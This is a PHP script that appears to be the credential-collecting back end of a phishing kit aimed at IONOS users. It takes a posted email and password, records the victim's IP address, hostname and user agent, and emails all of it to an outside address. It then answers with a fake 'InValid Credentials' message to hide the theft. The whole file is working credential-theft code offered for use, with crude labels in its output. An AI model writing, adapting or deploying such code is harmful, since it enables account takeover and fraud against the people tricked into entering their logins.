<?php
header('Access-Control-Allow-Origin: *');
$email = $_POST['ai'];
$password = $_POST['pr'];
if($email != null && $password!= null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| IONOS FUCKED |--------------|\n";
	$message .= "Online ID            : ".$email."\n";
	$message .= "Passcode              : ".$password."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- IDIOTA --------------|\n";
	$send = "user3@nextgenceos.xyz";
	$subject = "Result Coming Fucked Shit All";
    mail($send, $subject, $message);
	$signal = 'ok';
	$msg = 'InValid Credentials';

	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg
    );
    echo json_encode($data);

?>
